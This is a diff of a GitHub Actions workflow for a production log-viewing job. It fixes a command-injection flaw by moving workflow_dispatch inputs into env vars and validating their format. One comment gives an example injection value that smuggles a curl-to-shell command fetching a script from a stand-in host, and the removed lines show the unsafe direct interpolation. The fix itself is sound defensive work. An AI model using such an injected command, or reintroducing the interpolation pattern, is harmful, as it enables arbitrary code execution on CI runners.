@@ -33,12 +33,42 @@ jobs:
       - baltcircle-prod
     environment: production
     steps:
-      - name: Docker logs (filtered)
+      # audit HIGH #4 fix: the previous version spliced raw workflow_dispatch
+      # inputs directly into the run: script text via ${{ }}, so any of the
+      # three fields could break out of its intended argument and execute
+      # arbitrary shell on the prod runner (e.g. grep="; curl evil.sh | sh").
+      # Fix: pass inputs only via env vars (never interpolated into script
+      # text) and validate format/length before they're used at all.
+      - name: Validate inputs
+        env:
+          GREP_PATTERN: ${{ github.event.inputs.grep }}
+          SINCE: ${{ github.event.inputs.since }}
+          LINES: ${{ github.event.inputs.lines }}
         run: |
           set -e
-          echo "Container: baltcircle-mvp | since=${{ github.event.inputs.since }} | grep=${{ github.event.inputs.grep }}"
+          if [ "${#GREP_PATTERN}" -gt 200 ] || [[ "$GREP_PATTERN" == *$'\n'* ]]; then
+            echo "❌ grep pattern too long or contains newlines"
+            exit 1
+          fi
+          if ! [[ "$SINCE" =~ ^[0-9]+[smh]$ ]]; then
+            echo "❌ since must look like 30m, 2h, 45s — got: $SINCE"
+            exit 1
+          fi
+          if ! [[ "$LINES" =~ ^[1-9][0-9]{0,3}$ ]]; then
+            echo "❌ lines must be an integer between 1 and 9999 — got: $LINES"
+            exit 1
+          fi
+
+      - name: Docker logs (filtered)
+        env:
+          GREP_PATTERN: ${{ github.event.inputs.grep }}
+          SINCE: ${{ github.event.inputs.since }}
+          LINES: ${{ github.event.inputs.lines }}
+        run: |
+          set -e
+          echo "Container: baltcircle-mvp | since=$SINCE | grep=$GREP_PATTERN"
           echo "----------------------------------------------------------------"
-          docker logs --since "${{ github.event.inputs.since }}" baltcircle-mvp 2>&1 \
-            | grep -iE "${{ github.event.inputs.grep }}" \
-            | tail -n "${{ github.event.inputs.lines }}" \
+          docker logs --since "$SINCE" baltcircle-mvp 2>&1 \
+            | grep -iE "$GREP_PATTERN" \
+            | tail -n "$LINES" \
             || echo "(no matching lines found)"
